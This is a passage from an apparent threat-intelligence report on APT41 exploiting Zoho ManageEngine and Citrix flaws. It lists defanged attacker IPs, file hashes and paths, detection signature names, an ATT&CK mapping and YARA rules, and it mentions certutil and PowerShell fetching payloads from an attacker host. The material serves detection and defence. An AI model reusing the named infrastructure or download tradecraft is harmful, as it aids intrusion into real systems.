\u0026nbsp;c0c467c8e9b2046d7053642cc9bdd57d)\u003C\/p\u003E\n\u003Cp\u003E\u2018fuc\u2019 (MD5: 155e98e5ca8d662fad7dc84187340cbc\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ECVE-2020-10189 (Zoho ManageEngine Desktop Central)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E66.42.98[.]220\u003C\/p\u003E\n\u003Cp\u003E91.208.184[.]78\u003C\/p\u003E\n\u003Cp\u003E74.82.201[.]8\u003C\/p\u003E\n\u003Cp\u003Eexchange.dumb1[.]com\u003C\/p\u003E\n\u003Cp\u003Einstall.bat (MD5: 7966c2c546b71e800397a67f942858d0)\u003C\/p\u003E\n\u003Cp\u003Estoresyncsvc.dll (MD5: 5909983db4d9023e4098e56361c96a6f)\u003C\/p\u003E\n\u003Cp\u003EC:\\Windows\\Temp\\storesyncsvc.dll\u003C\/p\u003E\n\u003Cp\u003EC:\\Windows\\Temp\\install.bat\u003C\/p\u003E\n\u003Cp\u003E2.exe (MD5: 3e856162c36b532925c8226b4ed3481c)\u003C\/p\u003E\n\u003Cp\u003EC:\\Users\\[redacted]\\install.bat\u003C\/p\u003E\n\u003Cp\u003ETzGG (MD5: 659bd19b562059f3f0cc978e15624fd9)\u003C\/p\u003E\n\u003Cp\u003EC:\\ManageEngine\\DesktopCentral_Server\\jre\\bin\\java.exe spawning cmd.exe and\/or bitsadmin.exe\u003C\/p\u003E\n\u003Cp\u003ECertutil.exe downloading 2.exe and\/or payloads from 91.208.184[.]78\u003C\/p\u003E\n\u003Cp\u003EPowerShell downloading files with Net.WebClient\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Ch4\u003EDetecting the Techniques\u003C\/h4\u003E\n\u003Cp\u003EFireEye detects this activity across our platforms. This table contains several specific detection names from a larger list of detections that were available prior to this activity occurring.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EPlatform\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ESignature Name\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EEndpoint Security\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EBITSADMIN.EXE MULTISTAGE DOWNLOADER (METHODOLOGY)\u003C\/p\u003E\n\u003Cp\u003ECERTUTIL.EXE DOWNLOADER A (UTILITY)\u003C\/p\u003E\n\u003Cp\u003EGeneric.mg.5909983db4d9023e\u003C\/p\u003E\n\u003Cp\u003EGeneric.mg.3e856162c36b5329\u003C\/p\u003E\n\u003Cp\u003EPOWERSHELL DOWNLOADER (METHODOLOGY)\u003C\/p\u003E\n\u003Cp\u003ESUSPICIOUS BITSADMIN USAGE B (METHODOLOGY)\u003C\/p\u003E\n\u003Cp\u003ESAMWELL (BACKDOOR)\u003C\/p\u003E\n\u003Cp\u003ESUSPICIOUS CODE EXECUTION FROM ZOHO MANAGE ENGINE (EXPLOIT)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ENetwork Security\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EBackdoor.Meterpreter\u003C\/p\u003E\n\u003Cp\u003EDTI.Callback\u003C\/p\u003E\n\u003Cp\u003EExploit.CitrixNetScaler\u003C\/p\u003E\n\u003Cp\u003ETrojan.METASTAGE\u003C\/p\u003E\n\u003Cp\u003EExploit.ZohoManageEngine.CVE-2020-10198.Pwner\u003C\/p\u003E\n\u003Cp\u003EExploit.ZohoManageEngine.CVE-2020-10198.mdmLogUploader\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EHelix\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ECITRIX ADC [Suspicious Commands]\u003Cbr\u003E\n\u0026nbsp;EXPLOIT - CITRIX ADC [CVE-2019-19781 Exploit Attempt]\u003Cbr\u003E\n\u0026nbsp;EXPLOIT - CITRIX ADC [CVE-2019-19781 Exploit Success]\u003Cbr\u003E\n\u0026nbsp;EXPLOIT - CITRIX ADC [CVE-2019-19781 Payload Access]\u003Cbr\u003E\n\u0026nbsp;EXPLOIT - CITRIX ADC [CVE-2019-19781 Scanning]\u003Cbr\u003E\n\u0026nbsp;MALWARE METHODOLOGY [Certutil User-Agent]\u003Cbr\u003E\n\u0026nbsp;WINDOWS METHODOLOGY [BITSadmin Transfer]\u003Cbr\u003E\n\u0026nbsp;WINDOWS METHODOLOGY [Certutil Downloader]\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Ch4\u003EMITRE ATT\u0026amp;CK Technique Mapping\u003C\/h4\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EATT\u0026amp;CK\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ETechniques\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EInitial Access\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EExternal Remote Services (T1133), Exploit Public-Facing Application (T1190)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EExecution\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EPowerShell (T1086), Scripting (T1064)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EPersistence\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ENew Service (T1050)\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EPrivilege Escalation\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EExploitation for Privilege Escalation (T1068)\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EDefense Evasion\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EBITS Jobs (T1197), Process Injection (T1055)\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ECommand And Control\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ERemote File Copy (T1105), Commonly Used Port (T1436), Uncommonly Used Port (T1065), Custom Command and Control Protocol (T1094), Data Encoding (T1132), Standard Application Layer Protocol (T1071)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Ch4\u003EAppendix A: Discovery Rules\u003C\/h4\u003E\n\u003Cp\u003EThe following Yara rules serve as examples of discovery rules for APT41 actor TTPs, turning the adversary methods or tradecraft into new haystacks for purposes of detection or hunting. For all tradecraft-based discovery rules, we recommend deliberate testing and tuning prior to implementation in any production system. Some of these rules are tailored to build concise haystacks that are easy to review for high-fidelity detections. Some of these rules are broad in aperture that build larger haystacks for further automation or processing in threat hunting systems.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003Eimport \u0026quot;pe\u0026quot;\u003C\/p\u003E\n\u003Cp\u003Erule ExportEngine_APT41_Loader_String\u003C\/p\u003E\n\u003Cp\u003E{\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; meta:\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; author = \u0026quot;@stvemillertime\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; description \u0026quot;This looks for a common APT41 Export DLL name in BEACON shellcode loaders, such as loader_X86_svchost.dll\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; strings:\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $pcre = \/loader_[\\x00-\\x7F]{1,}\\x00\/\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; condition:\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $pcre at pe.rva_to_offset(uint32(pe.rva_to_offset(pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].virtual_address) + 12))\u003C\/p\u003E\n\u003Cp\u003E}\u003C\/p\u003E\n\u003Cp\u003Erule ExportEngine_ShortName\u003C\/p\u003E\n\u003Cp\u003E{\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; meta:\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; author = \u0026quot;@stvemillertime\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; description = \u0026quot;This looks for Win PEs where Export DLL name is a single character\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; strings:\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $pcre = \/[A-Za-z0-9]{1}\\.(dll|exe|dat|bin|sys)\/\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; condition:\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $pcre at pe.rva_to_offset(uint32(pe.rva_to_offset(pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].virtual_address) + 12))\u003C\/p\u003E\n\u003Cp\u003E}\u003C\/p\u003E\n\u003Cp\u003Erule ExportEngine_xArch\u003C\/p\u003E\n\u003Cp\u003E{\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; meta:\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; author = \u0026quot;@stvemillertime\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; description = \u0026quot;This looks for Win PEs where Export DLL name is a something like x32.dat\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; strings:\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; \u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $pcre = \/[\\x00-\\x7F]{1,}x(32|64|86)\\.dat\\x00\/\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; condition:\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; \u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $pcre at pe.rva_to_offset(uint32(pe.rva_to_offset(pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].virtual_address) + 12))\u003C\/p\u003E\n\u003Cp\u003E}\u003C\/p\u003E\n\u003Cp\u003Erule RareEquities_LibTomCrypt\u003C\/p\u003E\n\u003Cp\u003E{\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; meta:\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; author = \u0026quot;@stvemillertime\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; description = \u0026quot;This looks for executables with strings from LibTomCrypt as seen by some APT41-esque actors https:\/\/github.com\/libtom\/libtomcrypt - might catch everything BEACON as well. You may want to exclude Golang and UPX packed samples.\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; strings:\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $a1 = \u0026quot;LibTomMath\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; condition:\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $a1\u003C\/p\u003E\n\u003Cp\u003E}\u003C\/p\u003E\n\u003Cp\u003Erule RareEquities_KCP\u003C\/p\u003E\n\u003Cp\u003E{\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; meta:\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; author = \u0026quot;@stvemillertime\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; description = \u0026quot;This is a wide catchall rule looking for executables with equities for a transport library called KCP, https:\/\/github.com\/skywind3000\/kcp Matches on this rule may have built-in KCP transport ability.\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; strings:\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $a01 = \u0026quot;[RO] %ld bytes\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $a02 = \u0026quot;recv sn=%lu\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $a03 = \u0026quot;[RI] %d bytes\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $a04 = \u0026quot;input ack: sn=%lu rtt=%ld rto=%ld\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $a05 = \u0026quot;input psh: sn=%lu ts=%lu\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $a06 = \u0026quot;input probe\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $a07 = \u0026quot;input wins: %lu\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $a08 = \u0026quot;rcv_nxt=%lu\\\\n\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $a09 = \u0026quot;snd(buf=%d, queue=%d)\\\\n\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $a10 = \u0026quot;rcv(buf=%d, queue=%d)\\\\n\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $a11 = \u0026quot;rcvbuf\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; condition:\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and filesize \u0026lt; 5MB and 3 of ($a*)\u003C\/p\u003E\n\u003Cp\u003E}\u003C\/p\u003E\n\u003Cp\u003Erule ConventionEngine_Term_Users\u003C\/p\u003E\n\u003Cp\u003E{\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; meta:\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; author = \u0026quot;@stvemillertime\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; description = \u0026quot;Searching for PE files with PDB path keywords, terms or anomalies.\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; sample_md5 = \u0026quot;09e4e6fa85b802c46bc121fcaecc5666\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; ref_blog = \u0026quot;https:\/\/www.fireeye.com\/blog\/threat-research\/2019\/08\/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; strings:\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $pcre = \/RSDS[\\x00-\\xFF]{20}[a-zA-Z]:\\\\[\\x00-\\xFF]{0,200}Users[\\x00-\\xFF]{0,200}\\.pdb\\x00\/ nocase ascii\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; condition:\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre\u003C\/p\u003E\n\u003Cp\u003E}\u003C\/p\u003E\n\u003Cp\u003Erule ConventionEngine_Term_Desktop\u003C\/p\u003E\n\u003Cp\u003E{\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; meta:\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; author = \u0026quot;@stvemillertime\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; description = \u0026quot;Searching for PE files with PDB path keywords, terms or anomalies.\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; sample_md5 = \u0026quot;71cdba3859ca8bd03c1e996a790c04f9\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; ref_blog = \u0026quot;https:\/\/www.fireeye.com\/blog\/threat-research\/2019\/08\/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; strings:\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $pcre = \/RSDS[\\x00-\\xFF]{20}[a-zA-Z]:\\\\[\\x00-\\xFF]{0,200}Desktop[\\x00-\\xFF]{0,200}\\.pdb\\x00\/ nocase 